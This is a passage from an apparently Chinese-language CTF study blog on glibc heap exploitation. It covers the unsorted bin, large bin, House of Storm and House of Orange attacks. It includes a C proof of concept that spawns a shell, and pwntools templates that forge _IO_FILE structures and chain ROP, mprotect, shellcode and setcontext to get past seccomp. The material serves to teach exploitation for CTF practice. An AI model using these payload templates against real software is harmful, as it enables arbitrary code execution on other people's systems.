<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></tbody></table></figure>

<p>也就是说此时chunk的fd为 (&amp;(p2-&gt;next)&gt;&gt;12) ^ &amp;p1，自己的地址&gt;&gt;12 ^ fd</p>
<p>glibc2.34之后取消了free_hook malloc_hook等</p>
<h3 id="8-unsorted-bin-attack"><a href="#8-unsorted-bin-attack" class="headerlink" title="8. unsorted bin attack"></a>8. unsorted bin attack</h3><p>双向循环链表，先进先出，以下几种情况会分到 unsorted bin 中</p>
<blockquote>
<p>1、当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中</p>
<p>2、释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中</p>
<p>3、当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话</p>
</blockquote>
<p>unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方</p>
<p>利用方法，修改unsorted bin中chunk的bk为目标地址-0x10，再去将其申请出来时进行以下操作：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="comment">//bck = chunk-&gt;bk</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></tbody></table></figure>

<p>最终target地址-0x10的位置就被写入了unsortedbin的地址 (unsorted_chunks (av))</p>
<h3 id="9-large-bin-attack"><a href="#9-large-bin-attack" class="headerlink" title="9. large bin attack"></a>9. large bin attack</h3><p>堆块管理器中最慢的一种管理方式，largebin 的范围是 size &gt; 0x400（x64）</p>
<p>large bin 采用双链表结构，里面的 chunk 从头结点的 fd 指针开始，按大小顺序进行排列。且不同的序号的largebin的差值不同(0x40*32,0x200*16,0x1000*8,0x8000*4,0x40000*2)</p>
<p>其chunk结构：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> {</span></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">};<span class="comment">// fd_nextsize 和 bk_nextsize 来链接到下一个 size 的堆块头部和上一个 size 的堆块头部，在相同 size 的堆块内部再通过 fd 和 bk 来进行内部的管理。类似横向和纵向链表</span></span><br></pre></td></tr></tbody></table></figure>

<p>为了管理的高效，在纵向链表(fd_nextsize/bk_nextsize)中，堆管理器维护一个循环的单调链表，由最大的 size（在这个 index 下的最大 size）作为表头，最小的 size 作为表尾，且首尾相连。</p>
<p>遍历unsortedbin代码如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range(size)) </span><br><span class="line">{</span><br><span class="line">  victim_index = smallbin_index(size);<span class="comment">//获取size对应的smallbin的index</span></span><br><span class="line">  bck = bin_at(av, victim_index);<span class="comment">//bck指向size对应的smallbin的链表头</span></span><br><span class="line">  <span class="comment">//fwd指向size对应的smallbin的链表中的新加入的chunk(small bin使用头插法)</span></span><br><span class="line">  fwd = bck-&gt;fd;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span><span class="comment">//如果不再smallbin的范围，也就是说在large bin 的范围</span></span><br><span class="line">{</span><br><span class="line">  victim_index = largebin_index(size);<span class="comment">//获取size对应的large bin的index</span></span><br><span class="line">  bck = bin_at(av, victim_index);<span class="comment">//bck指向size对应的large bin的链表头</span></span><br><span class="line">  fwd = bck-&gt;fd;<span class="comment">//fwd指向size对应的large bin的链表中的新加入的chunk</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">//如果large bin 非空，在largbin进行按顺序插入</span></span><br><span class="line">  <span class="keyword">if</span> (fwd != bck) {</span><br><span class="line">      <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">      size |= PREV_INUSE;</span><br><span class="line">      assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);<span class="comment">//默认不启用assert</span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">        large bin中的chunk是按从大到小排列的，如果size &lt; large bin </span></span><br><span class="line"><span class="comment">        的最后一个chunk，说明size是这个large bin中的最小的，我们把它</span></span><br><span class="line"><span class="comment">        加入到此large bin尾部。</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size)) {</span><br><span class="line">          </span><br><span class="line">          fwd = bck;</span><br><span class="line">          bck = bck-&gt;bk;</span><br><span class="line">          </span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">          large bin 中size最小的chunk的fd_nextsize会指向size最大的</span></span><br><span class="line"><span class="comment">          那个chunk，也就是首部的chunk。同样，large bin 中size最大的</span></span><br><span class="line"><span class="comment">          chunk的bk_nextsize会指向size最小的那个chunk。</span></span><br><span class="line"><span class="comment">          victim的bk_nextsize指向large bin原来最小的chunk，它的</span></span><br><span class="line"><span class="comment">          bk_nextsize指向最大的那个chunk。那么原来的最小的就成了第二小的了。</span></span><br><span class="line"><span class="comment">          把它fd_nextsize和bk_nextsize都修正。</span></span><br><span class="line"><span class="comment">          */</span></span><br><span class="line">          victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">          victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">          <span class="comment">//最大size的chunk的bk_nextsize，和原来最小chunk的bk_nextsize都指向victim</span></span><br><span class="line">          fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">      } </span><br><span class="line">      <span class="keyword">else</span> <span class="comment">//如果victim不是large bin 中最小的chunk</span></span><br><span class="line">      {</span><br><span class="line">          assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);<span class="comment">//默认不启用assert</span></span><br><span class="line">          <span class="comment">//从大到小（从头到尾）找到合适的位置</span></span><br><span class="line">          <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size) {</span><br><span class="line">              fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">          }</span><br><span class="line">    <span class="comment">//如果size刚好相等，就直接加入到其后面省的改fd_nextsize和bk_nextsize了</span></span><br><span class="line">          <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">              fwd = fwd-&gt;fd;</span><br><span class="line">          <span class="keyword">else</span> </span><br><span class="line">          {</span><br><span class="line">              <span class="comment">//size不相等，即size&gt;fwd-&gt;size，把victim加入到纵向链表中</span></span><br><span class="line">              victim-&gt;fd_nextsize = fwd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;bk_nextsize = victim;</span><br><span class="line">              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          }</span><br><span class="line">          bck = fwd-&gt;bk;</span><br><span class="line">      }</span><br><span class="line">  } </span><br><span class="line">  <span class="keyword">else</span> <span class="comment">//如果large bin 为空，将victim加入到纵向列表</span></span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//#define mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span></span><br><span class="line">mark_bin(av, victim_index); <span class="comment">//把victim加入到的bin的表示为非空</span></span><br><span class="line"><span class="comment">//把victim加入到large bin的链表中</span></span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></tbody></table></figure>

<p>当已经存在一个largebin Y和unsortedbin X，那么再申请一个堆块就会触发unsortedbin脱链，让unsortedbin中chunk插入到largebin中，如果满足 size (X) &gt; size (Y) &amp;&amp; index (size (X)) == index (size (Y))，那么 X 就会插入到 Y 的前面，从而触发这一串代码进行插入。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//victim是X、fwd是修改后的Y</span></span><br><span class="line">{</span><br><span class="line">    victim-&gt;fd_nextsize = fwd;<span class="comment">//1</span></span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<span class="comment">//2</span></span><br><span class="line">    fwd-&gt;bk_nextsize = victim;<span class="comment">//3</span></span><br><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="comment">//4</span></span><br><span class="line">}</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></tbody></table></figure>

<p>把 2 带入 4 得到：<code>fwd-&gt;bk_nextsize-&gt;fd_nextsize=victim</code><br>同时下面有：<code>bck-&gt;fd = victim;</code>（bck 也就是 fwd-&gt;bk）也就是说之前我们伪造的Y的 bk-&gt;fd 跟 bk_nextsize 指向的地址被改为了 victim，即 tartget1 + 0x10与target2 + 0x20 被改为了 victim</p>
<p>2.30以下存在一个利用方法叫作<strong>House_of_storm</strong>，<code>House_of_storm</code>是一种结合了<code>unsorted_bin_attack</code>和<code>Largebin_attack</code>的攻击技术,其基本原理和<code>Largebin_attack</code>类似，但是不同的是<code>Largebin_attack</code>只可以在任意地址写出chunk地址实际应用中除了泄漏一个堆地址并没有什么其他用处，所以其基本无害。而<code>House_of_storm</code>则可以导致任意地址分配chunk，也就是可以造成任意地址写的后果。</p>
<p>漏洞利用条件:<br>1.需要攻击者在<code>largebin</code>和<code>unsorted_bin</code>中分别布置一个chunk 这两个chunk需要在归位之后处于同一个<code>largebin</code>的index中且<code>unsortedbin</code>中的chunk要比<code>largebin</code>中的大<br>2.需要<code>unsorted_bin</code>中的<code>bk指针</code>可控<br>3.需要<code>largebin</code>中的<code>bk指针和bk_nextsize</code>指针可控</p>
<blockquote>
<p>相较于<code>Largebin_attack</code>来说 攻击需要的条件多出了一条“unsorted_bin中的bk指针可控”，相当于unsortedbin attack + largebin attack </p>
</blockquote>
<ol>
<li>unsorted_bin-&gt;bk = fake_chunk #把fake_chunk链到了unsorted_bin中</li>
<li>fake_chunk+0x10 = unsorted_bin #伪造fake_chunk的fd</li>
<li>fake_chunk+0x3 = unsorted_chunk #伪造fake_chunk的size</li>
<li>fake_chunk+0x18 = unsorted_chunk #伪造fake_chunk的bk</li>
</ol>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -ggdb -fpie -pie -o house_of_storm house_of_storm.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  presize;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  fd;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  bk;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  fd_nextsize;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>  bk_nextsize;</span><br><span class="line">}chunk;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *large_chunk,*unsorted_chunk;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *fake_chunk = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;chunk;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    </span><br><span class="line">    unsorted_chunk=<span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0X20</span>);</span><br><span class="line">    large_chunk=<span class="built_in">malloc</span>(<span class="number">0x408</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(large_chunk);</span><br><span class="line">    <span class="built_in">free</span>(unsorted_chunk);</span><br><span class="line">    unsorted_chunk=<span class="built_in">malloc</span>(<span class="number">0x418</span>);  <span class="comment">//large_chunk归位</span></span><br><span class="line">    <span class="built_in">free</span>(unsorted_chunk);  <span class="comment">// unsorted_chunk归位</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//重点一下3步</span></span><br><span class="line">    unsorted_chunk[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span> )fake_chunk;</span><br><span class="line">    large_chunk[<span class="number">1</span>]    = (<span class="keyword">unsigned</span> <span class="keyword">long</span> )fake_chunk+<span class="number">8</span>;</span><br><span class="line">    large_chunk[<span class="number">3</span>]    = (<span class="keyword">unsigned</span> <span class="keyword">long</span> )fake_chunk<span class="number">-0x18</span><span class="number">-5</span>;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">strncpy</span>(ptr, <span class="string">"/bin/sh\x00"</span>, <span class="number">0x10</span>);</span><br><span class="line">    system(((<span class="keyword">char</span> *)fake_chunk + <span class="number">0x10</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>所以当我们申请的size和<code>0x56</code>经过对齐后相等的话，那么就可以拿到任意的chunk。</p>
<p>0x55 : <code>1010101</code></p>
<p>0x56 : <code>1010110</code></p>
<p><code>__int_malloc</code>在拿到chunk后返回到<code>__libc_malloc</code>，<code>__libc_malloc</code>会对chunk的进行检查，这里如果有错的话会直接crash，但是由于程序有随机化，多运行几次总能有一次成功的。</p>
<p>利用 large bin attack 分别错位写一个 size 和 bk 的地址，size 错位写了 0x56（由于 pie 的原因，chunk 的地址总是为 6 字节，但是头部地址可能是 0x55 或者 0x56，这里需要 0x56 才能成功，因为 malloc 后会进行检测）</p>
<p>以下检测需要满足的要求，只需满足一条即可</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	#define arena_for_chunk(ptr) \</span></span><br><span class="line"><span class="comment">    	(chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    过以下检测需要满足的要求，只需满足一条即可</span></span><br><span class="line"><span class="comment">    1. victim 为 0</span></span><br><span class="line"><span class="comment">    2. IS_MMAPPED 为 1</span></span><br><span class="line"><span class="comment">    3. NON_MAIN_ARENA 为 0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">assert(!victim || chunk_is_mmapped(mem2chunk(victim)) </span><br><span class="line">       || ar_ptr == arena_for_chunk(mem2chunk(victim)));</span><br></pre></td></tr></tbody></table></figure>

<p>利用 unsorted bin attack 在 fd 的位置写一个 main_arena + 88 的地址，从而绕过了检测。</p>
<p><img src="https://files.catbox.moe/s5ri0y.png" alt="image-20221115172747936"></p>
<h3 id="10-House-of-Orange"><a href="#10-House-of-Orange" class="headerlink" title="10. House of Orange"></a>10. House of Orange</h3><p>总体流程：</p>
<ol>
<li>题目中没有free，那么通过修改top chunk的size为一个小数，再申请一个大于该size的堆块，那么系统会调用sysmalloc通过brk拓展 top chunk，其中就会free掉old_top_chunk。</li>
<li>通过修改bk进行unsorted bin attack修改_IO_list_all为unsorted bin地址（main_arena+88）</li>
<li>同时在可控的unsorted bin里伪造0x60大小的IO_file_plus和 vtable 结构</li>
</ol>
<p>注：需要伪造0x60大小的字段，原因是unsorted bin attack之后_IO_list_all改为main_arena+88的地址，我们并不可控，而*chain域的偏移是0x68，main_arena+88+0x68刚好是small bin的0x60大小，将unsorted bin中的chunk的size修改为0x60且在old top chunk中布置伪造的IO_FILE，写入之后，再进行申请时，因为大小不合适unsorted bin chunk就会被链入smallbin的0x60数组中，即伪造的堆块被放入了IO_FILE结构体链表中，由于unsorted bin结构被破坏，所以在之后的检测发生了报错，这个报错就会调用到_IO_flush_all_lockp，而这里就会对_IO_list_all 进行遍历，调用 _IO_OVERFLOW (fp, EOF) getshell。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">...</span><br><span class="line"> <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">{</span><br><span class="line">   victim_index = smallbin_index (size);</span><br><span class="line">   bck = bin_at (av, victim_index);</span><br><span class="line">   fwd = bck-&gt;fd;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//先解链，再放入small bin</span></span><br></pre></td></tr></tbody></table></figure>

<p>当glibc检测到内存错误时，会依次调用这样的函数路径：malloc_printerr -&gt; libc_message-&gt;__GI_abort -&gt;  _IO_flush_all_lockp -&gt; _IO_OVERFLOW，_IO_flush_all_lockp 会把 _IO_list_all作为链表头开始遍历，并把当前节点作为 _IO_OVERFLOW 的参数。</p>
<p><img src="https://files.catbox.moe/r1xrri.png" alt="image-20221116225235056"></p>
<p>伪造 fp-&gt;_mode = 0， fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base来通过验证即可</p>
<p>64位的_IO_FILE_plus构造模板：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">stream = <span class="string">"/bin/sh\x00"</span> + p64(<span class="number">0x61</span>)</span><br><span class="line">stream += p64(<span class="number">0xDEADBEEF</span>) + p64(IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">stream += p64(<span class="number">1</span>) + p64(<span class="number">2</span>) <span class="comment"># fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line">stream = stream.ljust(<span class="number">0xc0</span>,<span class="string">"\x00"</span>)</span><br><span class="line">stream += p64(<span class="number">0</span>) <span class="comment"># mode&lt;=0</span></span><br><span class="line">stream += p64(<span class="number">0</span>)</span><br><span class="line">stream += p64(<span class="number">0</span>)</span><br><span class="line">stream += p64(vtable_addr)  <span class="comment"># heap_base + 0x5E8当前位置</span></span><br><span class="line">stream += p64(<span class="number">0</span>)*<span class="number">2</span>  </span><br><span class="line">stream += p64(system_addr)  <span class="comment">#_IO_OVERFLOW  </span></span><br></pre></td></tr></tbody></table></figure>

<p>32位的_IO_FILE_plus构造模板：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">stream = <span class="string">"sh\x00\x00"</span>+p32(<span class="number">0x31</span>)   <span class="comment"># system_call_parameter and link to small_bin[4] </span></span><br><span class="line">stream += <span class="string">";$0\x00"</span>+p32(IO_list_all-<span class="number">0x8</span>)   <span class="comment"># Unsorted_bin attack</span></span><br><span class="line">stream +=p32(<span class="number">1</span>)+p32(<span class="number">2</span>)     <span class="comment"># fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line">stream = stream.ljust(<span class="number">0x88</span>,<span class="string">"\x00"</span>)  </span><br><span class="line">stream += p32(<span class="number">0</span>)    <span class="comment"># mode&lt;=0</span></span><br><span class="line">stream += p32(<span class="number">0</span>)</span><br><span class="line">stream += p32(<span class="number">0</span>)</span><br><span class="line">stream += p32(vtable_addr)  <span class="comment"># vtable_addr --&gt; system</span></span><br></pre></td></tr></tbody></table></figure>

<p>64位下seccomp禁用execve系统调用的构造模板：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">io_list_all = libc_base+libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">setcontext = libc_base+libc.symbols[<span class="string">'setcontext'</span>]</span><br><span class="line">mprotect = libc_base+libc.symbols[<span class="string">'mprotect'</span>]</span><br><span class="line">Open = libc_base+libc.symbols[<span class="string">'open'</span>]</span><br><span class="line">Read = libc_base+libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">Write = libc_base+libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400d93</span></span><br><span class="line">pop_rsi_ret = libc_base+<span class="number">0x00000000000202e8</span></span><br><span class="line">pop_rdx_ret = libc_base+<span class="number">0x0000000000001b92</span></span><br><span class="line">pop_rdi_rbp_ret = libc_base+<span class="number">0x0000000000020256</span></span><br><span class="line">pop_three_ret = <span class="number">0x0000000000400d8f</span></span><br><span class="line">ret = <span class="number">0x00000000004008d9</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.cat(<span class="string">'flag'</span>))</span><br><span class="line"></span><br><span class="line">rop = flat(</span><br><span class="line">    p64(pop_rdi_ret),</span><br><span class="line">    p64(current_io_chunk&amp;~<span class="number">0xfff</span>),</span><br><span class="line">    p64(pop_rsi_ret),</span><br><span class="line">    p64(<span class="number">0x1000</span>),</span><br><span class="line">    p64(pop_rdx_ret),</span><br><span class="line">    p64(<span class="number">7</span>),</span><br><span class="line">    p64(mprotect),</span><br><span class="line">)</span><br><span class="line">rop += p64(current_io_chunk+<span class="number">0x30</span>+<span class="built_in">len</span>(rop)+<span class="number">8</span>)+shellcode</span><br><span class="line"></span><br><span class="line">fake_vtable = current_io_chunk+<span class="number">0xe0</span>-<span class="number">0x18</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>)</span><br><span class="line">payload += p64(<span class="number">0xddaa</span>) + p64(io_list_all-<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">2</span>) + p64(<span class="number">3</span>)</span><br><span class="line">payload += rop</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += p64(current_io_chunk+<span class="number">0x30</span>) <span class="comment">#rsp</span></span><br><span class="line">payload += p64(ret) <span class="comment"># to rop</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xd8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += p64(fake_vtable)</span><br><span class="line">payload += p64(setcontext+<span class="number">53</span>) <span class="comment"># 0xe0</span></span><br></pre></td></tr></tbody></table></figure>

